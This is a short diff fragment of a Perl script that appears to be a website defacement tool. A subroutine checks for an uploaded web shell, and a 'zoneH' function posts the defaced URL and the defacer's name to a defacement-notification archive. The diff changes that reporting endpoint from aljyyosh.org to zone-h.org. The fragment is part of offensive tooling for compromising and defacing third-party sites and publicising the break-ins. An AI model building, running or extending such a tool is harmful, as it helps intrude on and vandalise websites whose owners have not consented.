@@ -617,7 +617,7 @@ sub checkUloadedShell {
 ## ZONE-H
 sub zoneH {
   my ($url, $uploader)=@_;
-  my $zoneHurl="http://aljyyosh.org/single.php";
+  my $zoneHurl="http://www.zone-h.org/notify/single";
   my $ua = LWP::UserAgent->new;
   my $res = $ua->post($zoneHurl,
                  Content => ['defacer' => $uploader,
